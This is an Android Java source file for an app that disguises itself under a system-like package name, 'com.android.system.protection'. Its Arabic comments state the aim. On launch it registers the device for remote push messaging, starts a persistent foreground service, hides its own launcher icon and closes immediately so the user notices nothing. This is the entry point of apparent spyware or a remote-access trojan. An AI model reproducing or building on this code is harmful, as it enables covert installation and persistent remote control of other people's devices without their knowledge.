package com.android.system.protection;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

import com.android.system.protection.fcm.RegistrationService;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. تشغيل الخدمة الدائمة وتسجيل الجهاز
        startSystemServices();

        // 2. إخفاء أيقونة التطبيق من الشاشة ودرج التطبيقات
        hideAppIcon();

        // 3. إنهاء الواجهة فوراً (لن يلاحظ المستخدم شيئاً)
        finish();
    }

    private void startSystemServices() {
        RegistrationService.ensureTokenRegistered(this);
        Intent serviceIntent = new Intent(this, ForegroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, com.android.system.protection.MainActivity.class);
        p.setComponentEnabledSetting(componentName, 
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                PackageManager.DONT_KILL_APP);
    }
}
